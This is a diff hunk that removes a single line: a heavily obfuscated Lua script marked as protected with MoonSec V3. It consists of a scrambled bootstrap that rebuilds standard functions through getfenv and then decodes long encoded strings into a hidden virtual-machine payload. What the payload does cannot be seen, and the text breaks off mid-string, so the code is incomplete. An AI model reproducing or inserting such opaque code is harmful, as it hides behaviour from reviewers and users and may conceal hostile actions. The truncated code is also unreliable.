@@ -1,1 +1,503 @@
-([[This file was protected with MoonSec V3]]):gsub('.+', (function(a) _ERYdtDhv_gsA = a; end)); return(function(t,...)local a;local u;local d;local r;local o;local l;local e=24915;local n=0;local f={};while n<983 do n=n+1;while n<0x371 and e%0x4c08<0x2604 do n=n+1 e=(e*54)%7209 local _=n+e if(e%0xce6)>=0x673 then e=(e*0x222)%0x1c9f while n<0x15b and e%0x1af0<0xd78 do n=n+1 e=(e+447)%46921 local u=n+e if(e%0x31f0)<=0x18f8 then e=(e+0x1af)%0xf68 local e=40306 if not f[e]then f[e]=0x1 a=getfenv and getfenv();end elseif e%2~=0 then e=(e+0xfa)%0x2a0e local e=17740 if not f[e]then f[e]=0x1 o=tonumber;end else e=(e+0x12b)%0x912a n=n+1 local e=47794 if not f[e]then f[e]=0x1 l="\4\8\116\111\110\117\109\98\101\114\81\110\121\70\86\103\113\115\0\6\115\116\114\105\110\103\4\99\104\97\114\65\114\83\97\73\119\108\66\0\6\115\116\114\105\110\103\3\115\117\98\99\77\102\66\114\80\82\103\0\6\115\116\114\105\110\103\4\98\121\116\101\115\118\113\107\80\76\114\122\0\5\116\97\98\108\101\6\99\111\110\99\97\116\89\116\89\77\111\86\105\66\0\5\116\97\98\108\101\6\105\110\115\101\114\116\115\118\70\121\98\112\69\66\5";end end end elseif e%2~=0 then e=(e*0x255)%0x4bf4 while n<0x357 and e%0xc6e<0x637 do n=n+1 e=(e+280)%40765 local l=n+e if(e%0x48ac)>=0x2456 then e=(e-0x255)%0x40f3 local e=28368 if not f[e]then f[e]=0x1 u=function(f)local e=0x01 local function n(n)e=e+n return f:sub(e-n,e-0x01)end while true do local f=n(0x01)if(f=="\5")then break end local e=d.byte(n(0x01))local e=n(e)if f=="\2"then e=r.QnyFVgqs(e)elseif f=="\3"then e=e~="\0"elseif f=="\6"then a[e]=function(n,e)return t(8,nil,t,e,n)end elseif f=="\4"then e=a[e]elseif f=="\0"then e=a[e][n(d.byte(n(0x01)))];end local n=n(0x08)r[n]=e end end end elseif e%2~=0 then e=(e*0x189)%0x3502 local e=26132 if not f[e]then f[e]=0x1 d=string;end else e=(e-0x2ba)%0x5585 n=n+1 local e=48158 if not f[e]then f[e]=0x1 end end end else e=(e*0x43)%0x365 n=n+1 while n<0x37c and e%0x1efc<0xf7e do n=n+1 e=(e*90)%44778 local u=n+e if(e%0x2a9e)<=0x154f then e=(e*0x370)%0x3769 local e=67191 if not f[e]then f[e]=0x1 r={};end elseif e%2~=0 then e=(e+0x13b)%0x3868 local e=24646 if not f[e]then f[e]=0x1 end else e=(e-0x1ee)%0x5aab n=n+1 local e=57525 if not f[e]then f[e]=0x1 a=(not a)and _ENV or a;end end end end end e=(e-449)%7872 end u(l);local n={};for e=0x0,0xff do local f=r.ArSaIwlB(e);n[e]=f;n[f]=e;end local function _(e)return n[e];end local f=(function(l,u)local t,f=0x01,0x10 local n={{},{},{}}local a=-0x01 local e=0x01 local d=l while true do n[0x03][r.cMfBrPRg(u,e,(function()e=t+e return e-0x01 end)())]=(function()a=a+0x01 return a end)()if a==(0x0f)then a=""f=0x000 break end end local a=#u while e<a+0x01 do n[0x02][f]=r.cMfBrPRg(u,e,(function()e=t+e return e-0x01 end)())f=f+0x01 if f%0x02==0x00 then f=0x00 r.svFybpEB(n[0x01],(_((((n[0x03][n[0x02][0x00]]or 0x00)*0x10)+(n[0x03][n[0x02][0x01]]or 0x00)+d)%0x100)));d=l+d;end end return r.YtYMoViB(n[0x01])end);u(f(128,"!O7=xf}tVgE62AbcVf"));u(f(56,"TpPo-e6qmOV?7g(Y7mO67?O-eVpO(6VqZ7o-vg7gOm6oPY7Om7ePogp-gYo-Ygox(??pm--7pe?pmP6(ogg77qOV(O?e(m?Pqpo(=7VVV;e(PgYiOpep-wVA6(Vo67oPYp?(qY(epegpV76ooQge7pOme7j4(gOe6PgNO77gmO6-P*me?-q-ogpmgmq--VPP7YVVqP-YYwq---qoPgc-7emee7pp(7Vp6Vo7YgVmOgogoXYomY6YPgV-6Ym6egPoY7?YmVpoY770qgeeP((p?(OV(7?-(YVpqp--ppg,mp-pPmgY7PmPgVVpVpVVo7pmYpVsq7-6p?q--cq-oqlo77OPepp(gY?V6V-q(o77m7oeY7m.-gm-oOtPg-OeY(oeY671qO-opo?e?pqoPO2O?gmeog?-q(?eq6-EYO7oOoeYP-gq?-mo-VYq(po-Ygo0YV?Om6e-Ag(eOY-P-pge7om((7?6(?Veq-oeY?g-V:o6pk7P?oeO-m(e6mo-6ePpY7?mpg-6p-gYVqqPo-*VV(q6-;.V7(?6,g"));local e=(-27556+(function()local f,n=0,1;(function(e)e(e(e))end)(function(e)if f>395 then return e end f=f+1 n=(n-742)%34968 if(n%1110)>555 then return e else return e(e(e))end return e(e(e))end)return n;end)())local h=r.olWlsrWy or r.EysayeeU;local de=(getfenv)or(function()return _ENV end);local l=4;local u=3;local a=2;local j=1;local function ne(c,...)local s=f(e,"&^E0O4n=?_)auvBfa4_nB^Eu==uE>v4?)0BB0__O>f^an_aifaOnvnO)_uvfaB^s40_BB_=vfE^n?Ou^#f4a)4?vBtEEnva?nuauWfO__vBB0O?EvO)=fn0u?=vE?)u_E=n^a^_4B_E)=4uQ4faa^_nY?)B4EB?Ou?^Ef)O??fv)E4anEB=fuO_vfE0E=vu?4avE^vnO_EBfO=_nvO^_nnOv)vBEEv=?^==0v^^?OE)Bf=0f?nuaC4nB)?m:4G_?vO0bnBuEwEn00n?=ua^nn^^04uanfO0v_^BOa)(BOf_)B4?0BfE=?4v^^)04)uBu0?^f=)aOffO)B=O4_aBEE)nfa?^n4E_uvnOE??vn^Rn^))_^vaEn=^au-?4)_vB?00B4EB??aBVB4naOBuvnE^nua=dEOv_?B0nB=)v)Kf4))4OE)*B)E_En)?E==^a=a0En_EB?00nfu=uHn^n=)ffvO_n0a0f?O0?B^)?av-E0=0=__u(%0^=uu=nnufb_4=)0u)EOn?__fnn0)Bfa4^)yu4E==Ou=^=4=_)f?0??_v0a^#xOn_^vunvBO^B=4a?_fBv0O=fu)=vvO^fnnOE_=v=EEnv3Bnuu%7v4__qBn^)?0uS^?fEO4?=vE^vaa^?nu)vv44E)0B0E0su4))^Bu0=uO0u=uvu)fffOO?fv)_?BOEvnfafQ0B?0a=vu?^0aE>Bnua0vn0n?EvNEERE4__=BEEva_0??Eu?BB4B)0f004?v)vEnn4O?_?vvE?=0xk=?unI0Of)=?^v)^nn^)uOa)=I4Ounnvn^)=?)Eff4=)nBOE_=n4va0fE0v??E4?vvBE?nOauv?Ou_OvaEf?x4?afBv0??0EE?au4^04f?nB{EO44u4EBn?aneE0)_?Bf0B=_vE^BO=)4BB0a?)BE^unnOB_uB0EB=_Ea=Pu= )f^Op?nv^^uv)EE4BafZ^vfEB=Oafh))_jf4n_aBfuvEOnE)vf??nf)OE?_vvEB4Eafff4a_vB^0)^0nE)?f00BuuO0?av_E=H^40_nB^Euuuean6uu^44v)OB_uf^)n4agfaOn_^04n==Eavc?40_BB_0Ou??)^nn0)afnO^ff4I_9nBaf%0OB__4=_OBu0a=_aBlafEOn?=vE^va^E^nBaBL?E^?fvuE^=_4=)BBu0=?E^u?n)n^)nE)_fvOBn)BnE9=Ou4_uB=0E=vu?^04B^E0OOZ_0v4EFna^vnnu#fnO=)0vv0^?E4)aaBf0)?4EO?vu=^4n^??BEEn4=aOEEnv_v^0Of)EvO0)n4u=^E4uaO?BBEE0nBa_OB)EB_00=OBYE_?!u%buf0OE??v0^BaE^?na)ff_BKEa=nu^9u4=)EBv0??OvE^_nO)fnnaOf^0fE==aauk=4Ef^Ov)afE,u?0ua^_n==0?uv)E^nua=4naE^j4=Ef?suO7f4)TanE))f0E0n0)_a0,DO?_0vB_}v_00ya4f)SBa0nvO0a?uvO^C4v_nBfO=_==MaBI44Y_a0_)nBuB?^0n^)?f00Bvu0v__ufan:=Oa_nB^=uB0E0?nav^4n^0)??uf^)n4fB4ua0fnvvEB=EavH?an3v4=)?BO0??_n^u^fnO^?u^_?0v5E0n)ubD?4__vvB^_?Eau^OnO)uB?OO?Evn^n==O)_)vfE)=4^Znuu?qn4))a?0vn^?n0)BOv)uf?0v_NvBEb=_uO_vBa0E=vu?4nuv^a4_O*_^v4E!naE?nnav;uO=)ABuuO^a4_)OBf__u)EE=Ou)E4O+)fi?0u?fBnff*)nq_fB)04B?0f?)v^tan_)=fBOv??B^Ev244E_)B40DB_Ea??4v)afE0v??O)=fvEE?{V4O_4BoEaafEf=uuu^n0E)nB=00=vn4aBf)O4_>^u_nB^E??K)4^^4))EB_EBn^uBTB4)O^_EvnE^nuf)=^aa<nO?_^Bvu40n4))4f5?fBB0)?f?=^?nnaOf?fB)#v40EE)u4^E4)))BnEf?au=^^^?a)f=Ov?u?fm==Oaf<_0__nvfB=n?_8)?f00B?_vO^fn)bBuIOu_fB^Eu==^4=ru)!?40)=uaOO?0nnanfaOn_^^f_nvBEu=)?n_fBu0O=fu)=nuO^?fnO^?uv=EEnva?B0?v_)fOEf=)u44Eauz_4u)0f_O^_Evn^=O^a?rTOB_u)?u^EG4n)^Bu?afOEB=uu?BfO_?vaB^v_OvBE^nfu0-_0a)OvBEu=?4fa^fO0f?)^B?BvBE)nEa)f)O=Ef=_u0KB4_)OBf0)n40f4an=avfuO=_EEn_nB000=v_=.=Oa)0B=0p=)nEu4f=OE?vE4_EvvE=4=aOfvOO?0Bf0?=)u)VBn4?4f^0=?EuBEEO:aB:_4EEu=)u^8u4=^nOB)aBBufE4nO)ff)_uf^OO_)a=Ea=__4 44^_fBEu)^u4f))f4_/f)O_?)BJEK=^aa__B?EB=_uOnO_BYB4vnv?=va^un=aEOO)v}=0^?BBn04=0a?84BuO}?^uu^=)4^_n^)?fuOvn?v/EBnn4^_fBn0^=uwv?^ua^uf00B?_vO^fn)a4f-?)_=feEu==uEn^avMf40)_f0O^?Ba?^4nvauf)0f?u=0uO6?40_B4a__f-0f=BvE^;f=Ov?uv=EEu^^v=auEvuOu_<B?00=4u=^_fEO4?=vE^va?^f4fuEf_4^=^B)E_AunO)^Bu0=u?0n?nu=fOnEanHEOBn?v?EO=Ea4_vfe0E=vu?4nunG)nE)vBfO^n_ufa=E4Ou_=BE?^B)EO=EaBB40f?0aO^^=Bu_^nnuaaB^Ofnuv?E^=4avRvOf?_fEEu=)unfB4ua0YE0v_nBEa):fOf_)B4=uB)E_=Eu?f=4B_BC^0?_Qn_OB_?B0EB=_uO4f/d%vn^)EBv0?v4^ =^)a^On?))yE0u_E=EB=G=4E_v0u_?B)EB?OuB^un__Of)En?vuv^)n=_nUn4n)Ev)0E=Eafu)^?n0)a04O=_(vBEEaaav684^uf^vEuaEua^O4??EuB^=nE)vn^)=?fvBEOnfa)=4a0fu4E_v=vv-^E4v)?4n_fBu0u?O_?E_=?afBfBEEu==uE?O4?)0BB0)?Ouf^)==uufaOn_^0zE==Eav^)4__BB_0OuFu)^4nLv^QgO^?uv=E?nva_,0_n__B?)f=)u4^on^)nfE0u?a4E^vn?a0s4O__4vfE)f_ud*a4n)EBu0=?Evf?an0)Bf___?fv)E4_!V_:n4^_uB=0Eu^u?^0n))_fO0f?av4E^nau?d0Ou_=BEOu=?u06B=_)fBf0)?4vc^an_a^fu4u_EvvE?=4aB(a4O)4fu04?Yua^vn^)vf=OE?vvu)0nBa_PO4n_)Bn0g?v0_^^4u)=fu0v??v0^BFOaOffO)_nB*Ev=nB^^O4=)EBv0??0^)^_n)uOf)O4_5f6En=Eau+?4E)^n?00=Bu_E_4f)af4OO7avnE^nuuv(EOB_?B0aE=_uO.f4a)4fo0a_?OO^un=aES=O?_0vBE_?=af<)44)^Ba0??^fu^BnE)vf??f?BE)EO?^u=144N_a0n0^=uu=0E4B)?f00B?_vOnEn)u=w_Oa_=B^=n==uEKv4?)BBB0_?Ov^^)n=a3EaO?_^vuE=)uavEE40a54u0O?Vu)0Onj)afnn^a?v=E0nva_U0?=__kOO)=)un^D4u)n440u)=B4^vn_a0ffO_B)vf0u?=ucHB4n3^Bu0=?EuvE?n0)ff_O=?fvuE4?Gua-n4^_uEO0E=Bu?E4nB)_f40fv)v4EZnavn4BOu_?BEEB=?wnoBnaBfBf0u?4B0^anna^fu4?_EvBE?=4aBXa4Oa^d=04?EuanBn^)uf=nE?Bv?E4nBaaPO_E_)f=0u=au_^^?u)=fE0v_)Bv^BnvaOE)O)_4B%0v??u^^^4=vEBv0??0Bo4vnOa4f)n)_IvaEn=^v)K=4O_vBB00?Yu_EO=n))fnOAu0vnE0nuu_^)Ov_)B0?n=_uOpf=))nfw0v?nv0^u))aEjf4^_0B^E_u^af9)44aEBf0n?4uunZnE)vf?44)=v_E_nf<=!44 _af?=4=uuv^E?0)?f00B?_fE^fnua4(nOa_?B^0u_!uE2B4?f)BB0a?OB^E=n4aEfa_^_^vuE=_Evnd?44_BBa0Oa0u)E==v)af_O^auv=EEnvu)^fOB_vBO4f=)u4^8nvavf^O^?=iE^vn?a0fB?2_OB^E)=)u3 v4na^fu0=?0uvnnn0aTf_=O)Ev)En=Tf=2n_B_uf=O0=vu_^0_a)_fO0f_uB=Etnvan4^Ou_=BEOv?nu0^p4_)nBf=v?4BEE?nnaOfuna_EvvE?=0v4e_4n_fBu04?EuaE?vO)uf)OEv?v?E0nBv_E4Of_vB400=af)^^nBa/fEO^??E4^Bn_aO^^4u_4B4Eau?u^1u4=aO:40??_uBnanO)ff)O4_?vaE_=^uEH=4O_vf?Ou=Bua^O?E))f?OTaaBnE^nBa=O,Ov__B0O<BuuO^E4))=f50a?nf^=un=a4fvOa_0EOE__OvOY)4?)KBB0n_uuuE==0)vf)O0vOv_E=nfu)6B45_vBnnB=uu?^Enfa0f0O^?_EO^fn)a4ExOf_nBOEu=)uE4;4?a4fu0_??uf00n4aIfaOnB)vuE)=EafV?44_Bfan)=fuB^4a?)afnO^)uB)EE=^a?A=OBvuBOO^=au4^44akEf^0u?=BO0)n?a_fB=__OvfE)?=u=Fa4v)^O?0=?EuvE)n))B2^OOafv)E4=>aaqv4^)#B=0)=vu)^0nBfffOOE?)HvEqnfan^0?E_=BnEvvUu0MB4_uOfn0)?_vo^fnnfOfu4_)?vvEv=0BB3_4O_ffuOn?7v^^n_^)uf=OE_fB)E0=4a_0OOf_)B4OE_^un^_4uv=fE0v??v0Ean_a?ff4E_4BEEa?n^=Ru4))EOO0??=uBO_au)ffvO4uuva?E=^Bu^04E)TB?nn=Bv_^O=^a=f4OO?aE^E^nua=EEn__?B=EB=vuOO04)a=fB0a?av^nBn=aEfv4))uvBEf=O^^ )44) fv0)?^v0^=aO)vf?O0?B^YEO=0a)9u4C_vBnO^dnu=^44vv)f0OE?_hOE4n)a?3#4^_n0EEu?_u?Cv4u)0fP0_?Ouf0)n=a!ffOn_4vu?E=Evv^240)EB_0?=feA^4=5a4fnOO?u0EEE=^a?00nT__B=Ef?0u4=44aanO=0u?)vE4)n?aOfBOf)0vfEB=4u_Ma4=)^Bv0=?EfB^?n0)BfaOO?fv)0=)faa/a4^auB=0E=vu?Eu4B)ffOO0?)v4E!nau=J^4^_=BOEv=_u0oBna)OfO0)?4vp^anna^^4O=_?vv0Z=0aB9_=O)_B)0B?cuu^n?))u^=4n?vB^E0==a_OaOf)RfO0:?nun^n4u)?fEO^??v0Ofn_aOffOf_4ByEa=nfECu4=)EfO0??0uB^__4)ff)O4_?vaEn=^au0?4E_vB?0O=Bu_^O4fO=f4O_?aB^E^nva=EE4B_?BuEB=)uOnE4)u41E0a?fv^E4n=f_fvOB)EvB0O=Ou)b)4n)9Bf0n?^fv^=nE)vfvO0?Bv_EO)Ha)544c)EBn0^=uu=O04v)?f00f?_vO^fn)BnUmOa_nB_Eu==uE1vf4)0f=0_?fuf^an4vs;^On_)vuE?=EJEq?=0)BB_0v=fv0^4)=)afu4y?uBEEE=4a?HOOB_)BOEf)au4^q4a)af^0u?=vE4=n?aufB4O_OBKE)?=u0;a4f)^O)0=?EuvE)=u)B*0OO)Bv)E4=CvaMB4^)nB=0u=vvO^0=BavfOO_?)vfEh=Eank^4C_=BaEv=)u0^>4_uOfE0)?Bv+EOnnBEfuO=f)vv0E=0u=M_4O_ffu==?/vn^n=B)uf=OE?vB^E0=?a_ nOf_uB44d?}un^u4ua^fE=E??B4E?n_udff4u_4B*Ea=nvuyunE)EBf0??4uB0_nu)fCnO4_)va4a=^uB^^4E))B??E=Bu_^O4fw0f4Ou?av?E^nBa=EEuB_?fAEB?0uOOO4)a=fv0a_Ov^=fn=aEfvO?)uvB0n=Ou^W)4=)9ka4E?^v)^=nu)vEOO0)KfnEO=Ba)E046_aBn0^_nu=EN4v))f0OT?_fO0En)uO+ 44_n^nEu?_9n3vn?)0^a0_?Ouf^)B?a8 )On_0vuE_=Euf^040)BB__E=fu)^4=Ea^fn4E?ufnEEnva?E0na__f4Ef?au4^u4aun(=0u_?vEEBn?v4fBn_)Yvf0a=4v^qa_4)^YuOB?EvB^?=O)B40OO?f00E4?,aaV?4^_BB=4EBBu?E04Ba_fOOv?)v40_naunq^Ov_=BOEv?)vamBn))OZB0)?4vj0a=aa^SvO=)0vvn^=0vB^^4OaXB)On?QEf^n?^anf=40?vB_E0)?a_XOnu_)f40T?aunEE4uu=Of0v_?v0EBn_a?ff4u^OBA0u=nBV.u4=)EUvO0?0vf^_=4)f40O4)EfnEn?OaunO4E_vB?00?)u_E44favf4OE?aB?Ennuu_REnu_?B0EB__uuTfnu)4qE0avfv^EB=BaE^^O?_avBE_=OafO^44aEBaO)?^uB^=nEB?f?4n?Bv_EOnfa)^=nO_af)0^)=u=^E4va)f)0B_BvOOfn)a4}J4^)4B^OE==uOev4_)0Bf0_?OXK^)n4a/<?On_^vuEv?^av^f40))B_04=fuu^4n<vufnO^?uB_EEnva?Z0=f__BOEf?au4^C4a)n=u0u_fvE^vn?a0fBOf)0vfO0=4uOVa4=)^f40=?EfB^?n0)B1uOO?fv)E4)^aaUn4^a^B=0E=vu?OO4B)_fO4=?)v4ExnaB=i^Ou_=fEEv=?u0zB?))OBf0)_Ovp^anna^EvO=_Evv0u=0aB;_4Ov1B)04?pBE^nn^)uf==0?vv?E0=_a_!OOf_)^n0(=aun^v4u)=fE4vfOv00?n_uEff=O_4D}0u=nvaDu=^)E0O0??_vv^_?5)f1qO4_^vaE)=^au0?4E_vB?O_=Bu_^O4fvaf4Oj?aBaE^nua=rE=B_?B0EB?uuOPf4))4E^0a?nv^04n=aEfvO?a0vBO0=OvaS)4n)IfvOa?^Bn^=?^)vf?O0)BB_EO?_a)^f4CfOBnO0_Eu=EB4vuOf00B?_vO00n)ufDLn=_nB0Eu_=u)sv=0)0k?0_B0uf0)nfae^nOn)uvu??=EufOu40aaB__)=fu)^4nd)afn4u?ufOEEnfa?E04O__Y!Ef_4u4En4aa?Fn0u)4vE4On?a0fBO_)=vfOn=4vB.a4=)^fBO;?EB_^?)=)Bf_OO)^f4E4?vaa^44^_uB=0E_Eu?Ef4B)afOOQ?)f4nunavEt^n=_=f?Ev?)En8B==)OWz0)?4vC^a=fa^^?O=aPvvE_=0vW^n4OaaB)4O?oua^n?^a=f=4B?vfOE0_na_^nnE_)x003_,un^^4u)=j40v)Ov00un_anff4ua^B5O?=nBI/u4=)E%v?O?0Ba^_?^)fEEO4)E40En_SauOU4E_vB?00?fu_0^4fu_f4OE?afnEOnuvOtEn)_?O=EB__vf7f==)4Yv0aa4v^0u=?aE^)O?a/vB=M=Ou4^_44afBa0n?^uv^=n0)vf?=O?Bv_EO?aa)A442_a^00^__u=0^4v)_f04;_uvO0un)vn(XOa_nB=O4==vf!v4?)OBf0_?Ouf^BB4a faOn_^vvE?=Eu^??40_BB_04?iua^4=EBffn4B?uBOEEnva?^4u^__CEEfvuu4^#4a)u_O0u)4vEEEn_aOfBO__OB0))=4ui}a4a)EBv0=?nOv^?n0)BffO4_>v)0=aOaaEO4^)_B=0E=vv)?n4Bu?fO?0?)v4EZnaa)<^na_=B0Ev=_u0ETnB)O1B0))Ovy^annv^^_O=a^vvO==0u^h_4O)?B)4O?suv^nn0)ufvO??vf=E0=ua)H4Of_aB40Ofaun^^4ua4f00B??v=_Bn_aOff4H_nB^Ea??0O5u=n)Eiu0??0uB0_BS)f^_O4)fva=f=^uBP)4EaBB?0a=Bu_^O4fa=f44f?af=E^nBa=^O4^_?X0EB)quO9f4))afO0a)nv^0nn?a0fvO?_0BE)_=Oaf!)nf)^Bu0n_00f^=?E)v^fO0?Bv_OO?ua)E44#aaBn=^=uuvEB4vu?f04??)v4^fn)a4,Oua_nB^Eu_^u0xB4?)=nB0_?OufOznna^fa4?%OvuO==Ev^s?40_BBfv==fB)^4?^)uf=O^?uv=EnBva?N0OBa)B40C=)v=?04aunf^4!?=vE^v??u_fBn__OffE)a4uT^^nB)^xu0=)?uB^_n0)ff_O?-fv)E4=lB^b=4E_uf_)4=vB?^0)*)_fO0f_S=?E#?aanEnOv_?BEEv=?u=?B4_)OBf4f?nv^^an)0^fuO=_Eq0E_=OaB^au=_fV)04u3ua^nn^aB0aOE)Bv??vnBa_rO44)_B44E=av{^^4v)=f00v??tO^Bn_aOETO)_4Br0^?4u^Ef4=)4Bv0_?0uf^_nOB6f)O4_:fuEn=^au!=au_vtu00)^u_^O4f))r)O6)fvnEEnua_{E4f8aB040=_Ev,f4))4fnO)?nf=^un?aEfBO?_nvBE_)4af )44ukBa0n?^uuO?nE)vf?n^?Bv_EOnfBaY44K_a#00^=uu=^E?4)?^?0B?avOO4n)aaJBOaaaB^4_=?u0Mv4?)0fEa_?Ouf^)_Ea^fuOna^0_E=__avEB40)_B_4)_^u)0ungv?f=OE?uWEEE=^0?-0OB__^^0:=au40!)=)n^?0u)nvEOan?v0?0O_avvf4s=4v=Aa4navBu4B?Efn^?n4)Bf_nx?f EE4_=aaDn4^))f00E)vu?OJ4f))fOn=?)v_)bnaan7^=__?B0Ev_?EH2B?^)O^n0)B^v!0au^a^E4O=a)vv_#=0uO^a4Ou?B)=??^uu^n?4)ufauE?vv?E0a^a)t4Of_Bn40V=aun0B4v)?fE4vB4v0O=n_vuff?4_4fE=O=nBaxunf)EBv0?)0B:^_?B)fEOO4_4vaEn?4au0E4EunB?00=Bva^?4fvnf4)=?avnE^nuuOPE==_?HfEB)OuO^4=E)4^)0avuvE^vn=aEfvOu^0vBE_=O^4ma4n)Uf^_)?^f=^=aN)Bf_O0?fv_E?Bfa)g44bB_B=0E=uua_E4v)?f0_O?)v4^f=uE?Je==_nO)Eu==uE^0n=)0^a0_?auf^an4aEfaOnuEvuE==EB=s?40_BB_n4=fu)^4?a)afnO^?uBoEE__a?e4OB_)BOEf?=u40u4au?f^0u?=fE0^n?BhfB=^_OO=E)=4uE}a?E)^BB0=?0uv^?f=)BEEOO?fv)E4=Qaf?n4^_uB=4f=Bu_^04BEvfO0f?)vnEznaanIBOu_=BE0^=?u0mB4))=Bf0)?40B?NvvaEg?O=_EvvnavfE=nuafB^4f)_fO0)?O_0)vc?OE?vv?nnufE_=?uOtuO)=0B)0O?4uB^n4B)_BvO4^f=PaOffO)BaO4?BB)0Y=B?_)uBv0??0uBOanO)ff)O4_TvaEn_^uB2=4E_vB?00?^u_^O=^))f4Oz?vvnEEnua=;OOv_?B0EB=_uOUf=)anfH0a?nv^^un_aExf4t_0ByE_=?af+)44u+ff0n?0uu^_nE)Bf?O0Bvv_Ennfaa*44Q_aBnn^=uu=^E4v)?fO0B?_4?^fn)a4T^Oa_nB^Eu==uE2v4?)uBB0_?Ov3Enn4alfa?_%-O)_av=Ea=u?jfEnE)OBOua^ans)afn?Bf^Oa?)vu^ulO4^__BOEfuf0==u4u)_f^0u?=^_nEauaO%BO__Ovf?aB40N==afHOOv)aBa0u?n_E^?nua0fvvaO_=maacna_^+4a)Ef 6EOE?vHv4vaEBvOO_EufBOnOaazO^^?BB?Eu0vufvv^B_vBv0^?_vO^nn?a)u^vB0_=0aB5_?0<uOf)?f0Eu=vun^f0n)BfnO4?uBEfn0442)^B40V=a,B=navQa4=)ffavOEan_aOff?a7)4O_0B400=4v^J0n^)^fE0uE_nO)ff)O4E?vaEn=^au;=4E_vB?On=Bu)^O4f))f?O5_vBvE^nBa=,?Ov_?B0EB?=uO^E4))nfP0a?nB0E^n=anfvOf_0vBE_=OvO7)4=)HBv0n?4uuE=nO)vf_O0_^v_EnnfB)_E4._uBn00=uua^E4vuBf0O3?_vO^fnua4cXnO_nBOEu=_uE5v4?a0f00_?nufE0n4a0fa=n_OvuE_=EaBH?4?_Bf_Ov=fua^4n?)af?O^?ufOEEnva?sOOB__BOEf?Bu4^l4a)nf^0u?=vE)^n?a0fBO)_OvfE)=4ueoa4n)^Bv0=?Euv^_nf)Bf_OOv?O?_avfEnna)Op^4_)?BE0)^_4B)_fO0fFOv4E^naanb^Ou_=8E0O=?uOyB4))OfH0)?4vu^an_a^fuO=_EvvE?=OaByv4O)qB)04?tua^Bn^)vf=On?vv_E0nBavQOOf_)Bn0%=aun^^4u)=fE0B?)v0^Bn_a4U4O)_4BW_OB_E==4u0g=BB0v?0uB^_vO^E4aa^fuBuEn=^au^_u4_vB?00=fu_^O4f))O_O7?uvnE^nua=-EOvf^B0EB=_unVf4u)4fn_f?nv^^unvaEfBO?_OvBEvfOafk)44)nBa0=?^vg_=nE)vf?4^?Bv)EO?^Evh44h_aB?0^=uu=^?nu)?fO0B?_vOEln)anA1OaaaB^Eu==uEYv4?)0BB_f?Ouf^)n=azfuOn_=ObE==Eav^440_fB_04=fuB_4nh)afnOB?uv?EE=^0?20OB__fEEf=au4^ B^)nfE0u?_vE^vn?a0)1O__OvfE)=4u/+a4nE=Bu0=?Euf^?n0)Bf_u??fv)E4=^aa/n4^_vB=0E=vu_^04B)_f4O=?)v4ETvv^anEasfvOa__vvu?2B4_)O;^_n?4vx^an=a^fuO=_EB=E?=OaBc_4O_fB)04?Eua^nn^)vf=OE?vv?0vnBa_}OOf_)B40(=av4^^4u)=f00v??v0^Bn_aOffO)_4fEEa=nu^sv4u)EBv0?f00^=)vA^afaO__%vaEnB?^v=_uQ_BBf00=Bu_=)uH^0n^)4Bf^6EE=Ga=iEOvfB4E_vvvu4^O4))4f{)aB=0)?Bv)a06EO?_0vB_vv4E^=na))^f40n?^uu4vua^f4v_nf0Oa_)vOEu,n44_aBn0^Bu0_=aua^ufO4E?_vO^fvEEO=*aaffOf_0_=0n=u=?<f4va;B_O^O?_0vBE_O=_0vuE==EEu=a4O)EB_0O=f0B=Buv^:f=O=?uv=EEvnEn=na0ba4?0G?Ou4^*4a^?4nayf_Oa?nvn^)Eu==_4B0E)=4u#?Ea=9)ny0??nuv^?n0^a4)a?f=vaEa=maa nu0fv44_nBu04^04B)_fO0f?)v4^N))anS^Ou_=BEEv=?u0-Ba^)OBf0)?40B^anna^fvO=_EvvE?=4aBM_4O_fB)04?(vvEun^)uf=Ou?vv?E0?Bv0NOOf_)B40>?nun^^nv)=fE0v?_v0E<n_aOQBO)_4BYEu=nu^<u4=fnBv0??0uB^_nO)f1i)__5vaEn=aau!?4E_BB?0=fBu_^O4faOf4O^?av))^nua=dE)O_?BOEB=_^?Cf4))4fE0a?nv^EEuaaEfvO?auvBE)=Ou/q)4_E,Ba0n?^f4^=n0)vf??^?Bv_EOnfa)}44<)vBu0^=vu=^=4v)?f00B?vvOE^n)a?#UOa_nc^Ev==uODv4))0fE0_?OBn^)nnaxfvOn_OvuEa=uavI?40anB_04=fvu??nya^fnO=?uv=EE?v^4:04O__B)Ef?nu4^Vu0)nf?0u?=vE^vn?a0nnO__uvfEB=4uepa4nE)Bu0v?Ev4^?nO)Bff=u?fvaE4?0aa%=4^_BB=0nfvu?^04BaufOOC?)v4n^naa=,^Ou_=BEEv?n4fpBna)O^?0)?nv*^unna4=uO=_Evv4^=0afb_nn^EB)0n?wv)^nn^)u^=?f?vv_E0nfa_^OOf)ur^03=vunEE4u)=fE0v_Ev0E^n_aOffO)_4BQEu=nuEQu4))EBf0??0BO^_nn)ff)O4_^vaEn?aau6)4E)^B?00=BB_E=4f)vf4O0?avvE^nu^f:E4E_?B4EB=_uOtfB0)4f00a?av^^vn=aE??O?_nvBE)=OafK)440EBa0_?^uB^=nE)v7)an?Bv_EO=va){44t)vfB0^=vu=E04v)?f00B?uvO^fn)a=h6Ou_nf0OE==uETvnE)0BB0_)OB0^)n4awfaOn_uvuE==)av/?40_fB_0n=fu)E^nM)ufnOE?uv=EEnvvsz0OB__BOEf=au4^t)f)nfE0u?uvE^vn?a_n_O__4vfn)=4u^za4n)^fca=?Euv^?)0)Bf)OO)^OvE4=VaaTB4^_uB=OOBOu?^O4BaEfO0f?)v40vnaan+^OB_=B0Ev=?v0+B4_)Of40)?4v!^a=Oa^fuO=_0vvE)=0uO^^4O_fB)=^?Quu^nn^)ufauE?vv?E0))a_z4Of_Bn40(=aunn?4u)?fEOffav0^fn_auffO)_4fEnf=nu07unO)EBv0??0O=^_n4)ffuO4_^vaE)f^au*=4EfOB?0O=Bva?=4f))f4O^?avnE^=EunmEOB_?BOEB=)uO^ 